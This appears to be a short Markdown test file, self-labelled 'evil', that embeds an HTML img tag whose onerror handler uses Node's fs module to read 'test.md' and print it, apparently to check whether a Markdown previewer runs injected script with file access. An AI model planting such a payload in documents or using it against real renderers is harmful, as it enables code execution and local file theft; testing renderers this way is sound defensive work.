# This file is evil!!

<img src=# onerror="
  var fs = require('fs');
  var md = fs.readFileSync('test.md', 'utf-8');
  console.log(md);
">
